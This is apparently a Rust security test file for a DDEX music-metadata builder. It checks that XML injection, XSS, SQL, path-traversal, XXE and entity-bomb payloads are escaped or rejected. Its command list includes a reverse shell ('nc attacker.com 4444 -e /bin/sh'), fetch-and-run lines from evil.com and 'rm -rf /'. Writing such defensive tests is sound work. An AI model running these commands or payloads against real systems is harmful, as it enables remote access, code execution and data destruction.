//! Malicious Payload Tests for DDEX Builder
//!
//! This module tests various malicious payloads in both parsing and building operations:
//! - XML injection in DDEX fields
//! - Script injection attempts
//! - SQL injection in metadata
//! - Path traversal in file references
//! - Command injection in processing instructions
//! - CDATA section abuse
//! - Encoding manipulation attacks
//! - Unicode normalization attacks
//! - XML bomb variations in DDEX context

use super::{assert_metadata_passes_through_builder, is_illegal_xml_char};
use ddex_builder::{
    error::BuildError,
    security::{InputValidator, SecurityConfig},
};
use serde_json::json;

/// Test XML injection in DDEX metadata fields.
///
/// Raw XML that tries to break out of an element through `]]>` or an unclosed
/// CDATA section is not well-formed and must be rejected. The same markup
/// carried as a JSON string *value* is just metadata text: it must be accepted
/// (the builder escapes it, see `test_malicious_json_to_xml_conversion`).
#[test]
#[ignore = "known bug: validate_xml_content accepts malformed CDATA / `]]>` in text; validate_json_content rejects script-looking metadata text (keyword blocklist)"]
fn test_xml_injection_in_ddex_fields() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // XML injection in title field
    let xml_injection_title = r#"<ddex:NewReleaseMessage>
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>Test Song]]></ddex:TitleText><ddex:Injected>malicious content</ddex:Injected><ddex:TitleText><![CDATA[</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    // `]]>` in character data and a CDATA section that is never closed: not well-formed
    let result = validator.validate_xml_content(xml_injection_title);
    assert!(
        result.is_err(),
        "XML breaking out of TitleText via ]]> / unclosed CDATA should be rejected"
    );

    // XML injection in artist name
    let xml_injection_artist = r#"<ddex:NewReleaseMessage>
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReleaseResourceReferenceList>
                    <ddex:ReleaseResourceReference>
                        <ddex:DisplayArtist>
                            <ddex:PartyName>Artist Name</script><script>alert('XSS')</script><![CDATA[</ddex:PartyName>
                        </ddex:DisplayArtist>
                    </ddex:ReleaseResourceReference>
                </ddex:ReleaseResourceReferenceList>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    // Mismatched `</script>` end tag plus an unclosed CDATA section: not well-formed
    let result = validator.validate_xml_content(xml_injection_artist);
    assert!(
        result.is_err(),
        "XML breaking out of PartyName via a stray end tag / unclosed CDATA should be rejected"
    );

    // Through JSON the same markup is only metadata text: accept it (it is escaped on output)
    let markup_json = json!({
        "messageHeader": {
            "messageId": "MSG001",
            "messageThreadId": "THREAD001"
        },
        "releases": [{
            "title": "Test Song<script>alert('xss')</script>",
            "artists": ["Artist</artist><malicious>injection</malicious><artist>"]
        }]
    });

    let result = validator.validate_json_content(&markup_json.to_string());
    assert!(
        result.is_ok(),
        "JSON whose string values look like markup should be accepted: {:?}",
        result
    );

    // Same for the payloads of test_malicious_json_to_xml_conversion
    let conversion_json = json!({
        "messageHeader": {
            "messageId": "&xxe;",
            "messageThreadId": "THREAD&entity;"
        },
        "releases": [{
            "title": "<![CDATA[Safe content]]><script>alert('XSS')</script><![CDATA[]]>",
            "artists": ["Artist</ddex:PartyName><ddex:MaliciousElement>injected</ddex:MaliciousElement><ddex:PartyName>", "&script_injection;"],
            "isrc": "US123456789<!--comment--><injection>test</injection>"
        }]
    });

    let result = validator.validate_json_content(&conversion_json.to_string());
    assert!(
        result.is_ok(),
        "JSON whose string values look like markup or entity references should be accepted: {:?}",
        result
    );
}

/// Script-looking text in DDEX metadata fields is not an XML-level threat: it must
/// be accepted unchanged, and is valid XML once escaped.
#[test]
#[ignore = "known bug: validate_string / validate_json_content reject script-looking metadata text (keyword blocklist: script, javascript, onerror, onload)"]
fn test_script_injection_attempts() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let script_payloads = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
    ];

    for payload in script_payloads {
        for field_name in ["TitleText", "PartyName", "LabelName", "Comment"] {
            // Escaped into a DDEX field, the payload is ordinary character data
            let full_xml = format!(
                r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43"><ddex:{f}>{}</ddex:{f}></ddex:NewReleaseMessage>"#,
                quick_xml::escape::escape(payload),
                f = field_name
            );
            let result = validator.validate_xml_content(&full_xml);
            assert!(
                result.is_ok(),
                "Escaped script-looking text in {} should be accepted: {:?}",
                field_name,
                result
            );

            // As a metadata string it must pass through unchanged
            let result = validator.validate_string(payload, field_name);
            assert_eq!(
                result.as_deref().ok(),
                Some(payload),
                "Script-looking text in {} should be accepted unchanged: {:?}",
                field_name,
                result
            );
        }

        let json = json!({ "releases": [{ "title": payload }] }).to_string();
        let result = validator.validate_json_content(&json);
        assert!(
            result.is_ok(),
            "JSON carrying script-looking text should be accepted: {:?} ({:?})",
            payload,
            result
        );
    }
}

/// SQL-looking text in metadata is not an XML-level threat (titles legitimately
/// contain quotes and words like "Drop" or "Select"): it must be accepted unchanged.
#[test]
#[ignore = "known bug: validate_string / validate_json_content reject SQL-looking metadata text (keyword blocklist: drop, select, union, insert, exec, …)"]
fn test_sql_injection_in_metadata() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let sql_payloads = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM passwords --",
        "'; INSERT INTO logs VALUES ('hacked'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "1' OR '1'='1",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' AND 1=1 --",
        "' OR 'a'='a",
        "') OR '1'='1 --",
        "' waitfor delay '00:00:10' --",
    ];

    for payload in sql_payloads {
        // Test in various DDEX metadata contexts
        let result = validator.validate_string(payload, "metadata_field");
        assert_eq!(
            result.as_deref().ok(),
            Some(payload),
            "SQL-looking metadata text should be accepted unchanged: {:?}",
            result
        );

        // Test in JSON context
        let sql_json = json!({
            "messageHeader": {
                "messageId": payload,
                "messageThreadId": "THREAD001"
            },
            "releases": [{
                "title": payload,
                "isrc": payload
            }]
        });

        let result = validator.validate_json_content(&sql_json.to_string());
        assert!(
            result.is_ok(),
            "JSON carrying SQL-looking text should be accepted: {:?} ({:?})",
            payload,
            result
        );
    }
}

/// Test path traversal attempts in file references
#[test]
fn test_path_traversal_attacks() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\\....\\....\\etc\\passwd",
        "..//////..//////etc/passwd",
        "....\\/....\\/....\\/etc/passwd",
        "/etc/passwd%00.txt",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/proc/self/environ",
        "/dev/null",
    ];

    for payload in path_traversal_payloads {
        // Test path validation
        let result = validator.validate_path(payload);
        assert!(
            result.is_err(),
            "Path traversal should be detected: {:?}",
            payload
        );

        // Test in DDEX XML with file references
        let xml_with_path = format!(
            r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
            <ddex:ResourceList>
                <ddex:SoundRecording>
                    <ddex:TechnicalSoundRecordingDetails>
                        <ddex:File>{}</ddex:File>
                    </ddex:TechnicalSoundRecordingDetails>
                </ddex:SoundRecording>
            </ddex:ResourceList>
        </ddex:NewReleaseMessage>"#,
            payload
        );

        // This should be caught by content validation if not by XML validation
        let _ = validator.validate_xml_content(&xml_with_path);
    }
}

const COMMAND_PAYLOADS: &[&str] = &[
    "; cat /etc/passwd;",
    "| whoami",
    "& dir &",
    "`id`",
    "$(whoami)",
    "|| ls -la",
    "&& echo 'hacked'",
    "; rm -rf / ;",
    "| nc attacker.com 4444 -e /bin/sh",
    "; wget http://evil.com/malware.sh | bash;",
    "$(curl evil.com/payload)",
    "`wget -O - evil.com/script | sh`",
];

/// Shell-looking text inside a processing instruction is never executed and is
/// well-formed XML: the validator must accept it.
#[test]
fn test_command_injection_attempts() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    for payload in COMMAND_PAYLOADS {
        // Test in XML processing instruction
        let xml_with_pi = format!(
            r#"<?xml version="1.0"?>
        <?command {}?>
        <ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
            <ddex:MessageHeader>
                <ddex:MessageId>TEST</ddex:MessageId>
            </ddex:MessageHeader>
        </ddex:NewReleaseMessage>"#,
            payload
        );

        let result = validator.validate_xml_content(&xml_with_pi);
        assert!(
            result.is_ok(),
            "A processing instruction with shell-looking text is well-formed XML and should be accepted: {:?} ({:?})",
            payload,
            result
        );
    }
}

/// Shell-looking text in metadata is not an XML-level threat: accept it unchanged.
#[test]
#[ignore = "known bug: validate_string rejects shell-looking metadata text (path heuristic on `/etc/`, keyword blocklist on `script`)"]
fn test_command_like_metadata_text_accepted() {
    let validator = InputValidator::new(SecurityConfig::default());

    for payload in COMMAND_PAYLOADS {
        let result = validator.validate_string(payload, "command_field");
        assert_eq!(
            result.as_deref().ok(),
            Some(*payload),
            "Shell-looking metadata text should be accepted unchanged: {:?}",
            result
        );
    }
}

/// Well-formed CDATA whose content looks like script or SQL is only text: accept it.
#[test]
fn test_cdata_wrapped_script_and_sql_text_accepted() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // CDATA with script content
    let cdata_script = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA[<script>alert('XSS in CDATA')</script>]]></ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(cdata_script);
    assert!(
        result.is_ok(),
        "CDATA holding script-looking text should be accepted: {:?}",
        result
    );

    // CDATA with SQL injection
    let cdata_sql = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA['; DROP TABLE albums; --]]></ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(cdata_sql);
    assert!(
        result.is_ok(),
        "CDATA holding SQL-looking text should be accepted: {:?}",
        result
    );
}

/// Test CDATA section abuse: malformed CDATA must be rejected
#[test]
#[ignore = "known bug: validate_xml_content accepts malformed CDATA (nested CDATA leaving `]]>` in text, unterminated CDATA)"]
fn test_cdata_section_abuse() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Nested CDATA attempt (invalid but worth testing)
    let nested_cdata = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA[Normal content <![CDATA[nested]]> more content]]></ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    // The first `]]>` closes the section, leaving ` more content]]>` as character
    // data, which is not well-formed
    let result = validator.validate_xml_content(nested_cdata);
    assert!(
        result.is_err(),
        "Nested CDATA should be rejected as malformed"
    );

    // CDATA with malformed end
    let malformed_cdata = r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText><![CDATA[Content without proper end</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(malformed_cdata);
    assert!(result.is_err(), "Malformed CDATA should be rejected");
}

/// Encoded (URL, HTML-entity, escape-sequence, base64) script-looking text in
/// metadata is just text: it must be accepted unchanged, never decoded or altered.
#[test]
#[ignore = "known bug: validate_string rejects script-looking metadata text (keyword blocklist), encoded or not"]
fn test_encoding_manipulation() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    let encoded_payloads = [
        // URL-encoded
        ("encoded_field", "%3Cscript%3Ealert('XSS')%3C/script%3E"),
        // Double URL-encoded
        (
            "encoded_field",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
        ),
        // HTML entity encoded script (standard and numeric references only)
        (
            "html_field",
            "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
        ),
        // Mixed encoding
        (
            "mixed_field",
            "%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E",
        ),
        // Unicode escape sequences
        (
            "unicode_field",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
        ),
        // Hex encoding
        ("hex_field", "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E"),
        // Base64 of <script>alert('XSS')</script>
        ("base64_field", "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="),
        // ... and the decoded payload itself
        ("decoded_field", "<script>alert('XSS')</script>"),
    ];

    for (field, payload) in encoded_payloads {
        let result = validator.validate_string(payload, field);
        assert_eq!(
            result.as_deref().ok(),
            Some(payload),
            "Encoded script-looking text in {} should be accepted unchanged: {:?}",
            field,
            result
        );
    }
}

/// Legitimate Unicode that merely resembles `<script>` or tries to dodge filters
/// (fullwidth and lookalike characters, zero-width characters, combining marks,
/// RTL override). It is valid text and must be accepted.
const LEGITIMATE_UNICODE_LOOKALIKES: &[&str] = &[
    // Different representations of '<script>'
    "\u{FF1C}script\u{FF1E}", // Fullwidth < and >
    "＜script＞",             // Fullwidth characters
    "\u{2039}script\u{203A}", // Single-pointing angle quotation marks
    "‹script›",               // Visual similarity
    // Homograph attacks
    "јаvascript", // Cyrillic lookalikes
    "ѕcript",     // Cyrillic 's'
    // Zero-width characters
    "sc\u{200B}ript", // Zero-width space
    "scr\u{200C}ipt", // Zero-width non-joiner
    "scri\u{200D}pt", // Zero-width joiner
    "scrip\u{FEFF}t", // Zero-width no-break space
    // Combining characters
    "s\u{0300}cript", // Combining grave accent
    "sc\u{0301}ript", // Combining acute accent
    // Right-to-left override
    "\u{202E}tpircs", // RLO + "script" reversed
];

/// Characters that are illegal in XML 1.0 documents.
const ILLEGAL_XML_CHAR_PAYLOADS: &[&str] = &[
    "script\u{0000}", // Null byte
    "script\u{0001}", // Start of heading
];

/// Test Unicode normalization attacks
#[test]
fn test_unicode_normalization_attacks() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    for attack in LEGITIMATE_UNICODE_LOOKALIKES {
        // Test in XML context
        let xml_content = format!(
            r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
            <ddex:ReleaseList>
                <ddex:Release>
                    <ddex:ReferenceTitle>
                        <ddex:TitleText>{}</ddex:TitleText>
                    </ddex:ReferenceTitle>
                </ddex:Release>
            </ddex:ReleaseList>
        </ddex:NewReleaseMessage>"#,
            attack
        );

        let xml_result = validator.validate_xml_content(&xml_content);
        assert!(
            xml_result.is_ok(),
            "Legitimate Unicode in TitleText should be accepted: {:?} ({:?})",
            attack,
            xml_result
        );
    }

    // Characters illegal in XML 1.0 may be rejected, but must never be passed on
    for attack in ILLEGAL_XML_CHAR_PAYLOADS {
        let result = validator.validate_string(attack, "unicode_field");
        if let Ok(sanitized) = &result {
            assert!(
                !sanitized.chars().any(is_illegal_xml_char),
                "Illegal XML character passed through validate_string: {:?}",
                sanitized
            );
        }
    }
}

/// Legitimate Unicode lookalikes must be accepted unchanged as metadata text.
#[test]
#[ignore = "known bug: validate_string rejects legitimate Unicode text that contains the substring `script` (keyword blocklist)"]
fn test_legitimate_unicode_metadata_accepted() {
    let validator = InputValidator::new(SecurityConfig::default());

    for text in LEGITIMATE_UNICODE_LOOKALIKES {
        let result = validator.validate_string(text, "unicode_field");
        assert_eq!(
            result.as_deref().ok(),
            Some(*text),
            "Legitimate Unicode metadata should be accepted unchanged: {:?}",
            result
        );
    }
}

/// Test XML bomb variations in DDEX context
#[test]
fn test_ddex_specific_xml_bombs() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Entity expansion in DDEX-specific elements
    let ddex_entity_bomb = r#"<!DOCTYPE ddex:NewReleaseMessage [
        <!ENTITY boom "BOOM! ">
        <!ENTITY boom2 "&boom;&boom;&boom;&boom;&boom;">
        <!ENTITY boom3 "&boom2;&boom2;&boom2;&boom2;&boom2;">
    ]>
    <ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>
            <ddex:Release>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>&boom3;</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#;

    let result = validator.validate_xml_content(ddex_entity_bomb);
    assert!(result.is_err(), "DDEX entity bomb should be blocked");

    // Large DDEX document structure abuse
    let mut large_ddex = String::from(
        r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">
        <ddex:ReleaseList>"#,
    );

    // Create many releases to exhaust memory
    for i in 0..1000 {
        large_ddex.push_str(&format!(r#"
            <ddex:Release>
                <ddex:ReleaseId>
                    <ddex:ISRC>TEST{:06}</ddex:ISRC>
                </ddex:ReleaseId>
                <ddex:ReferenceTitle>
                    <ddex:TitleText>Test Release {} with very long title text that repeats many times to create a large document structure that might cause memory exhaustion in XML parsers</ddex:TitleText>
                </ddex:ReferenceTitle>
            </ddex:Release>"#, i, i));
    }

    large_ddex.push_str(
        r#"
        </ddex:ReleaseList>
    </ddex:NewReleaseMessage>"#,
    );

    // ~300KB and 1000 releases: inside the default limits (100MB, 10,000 children)
    let result = validator.validate_xml_content(&large_ddex);
    assert!(
        result.is_ok(),
        "A large DDEX document within the default limits should be accepted: {:?}",
        result
    );

    // ... but over the 10KB limit of the restrictive config
    let restrictive = InputValidator::new(super::restrictive_security_config());
    let result = restrictive.validate_xml_content(&large_ddex);
    assert!(
        matches!(result, Err(BuildError::InputSanitization(ref msg)) if msg.contains("too large")),
        "A DDEX document over max_xml_size should be rejected: {:?}",
        result
    );

    // Deeply nested DDEX structure
    let mut deep_nested_ddex =
        String::from(r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43">"#);

    // Create deep nesting
    for i in 0..50 {
        deep_nested_ddex.push_str(&format!("<ddex:Level{}>", i));
    }

    deep_nested_ddex.push_str("DEEP CONTENT");

    for i in (0..50).rev() {
        deep_nested_ddex.push_str(&format!("</ddex:Level{}>", i));
    }

    deep_nested_ddex.push_str("</ddex:NewReleaseMessage>");

    // 51 levels is within the default max_xml_depth of 100, so it must be accepted.
    // (Enforcement of a lower max_xml_depth is a known bug, pinned by
    // integration_tests::test_memory_safety_under_attack.)
    let result = validator.validate_xml_content(&deep_nested_ddex);
    assert!(
        result.is_ok(),
        "Nesting within the default depth limit should be accepted: {:?}",
        result
    );
}

/// Hostile-looking metadata converted to XML by the real builder must come out
/// escaped: no injected elements, CDATA sections, comments, entity references or
/// DOCTYPE, and a reader gets the original text back.
#[test]
fn test_malicious_json_to_xml_conversion() {
    let payloads = [
        // Markup injection
        "<![CDATA[Safe content]]><script>alert('XSS')</script><![CDATA[]]>",
        "Artist</ddex:PartyName><ddex:MaliciousElement>injected</ddex:MaliciousElement><ddex:PartyName>",
        "US123456789<!--comment--><injection>test</injection>",
        "x]]>y",
        // Entity references and XXE text
        "&xxe;",
        "THREAD&entity;",
        "&malicious_entity;",
        "&script_injection;",
        "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        // Script / SQL / shell-looking text
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "$(curl evil.com/payload)",
        // Encoded text must not be decoded
        "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
    ];

    for payload in payloads {
        assert_metadata_passes_through_builder(payload);
    }

    for text in LEGITIMATE_UNICODE_LOOKALIKES {
        assert_metadata_passes_through_builder(text);
    }

    // Illegal XML 1.0 characters are pinned by
    // builder_security_tests::test_illegal_xml_chars_never_reach_builder_output
}
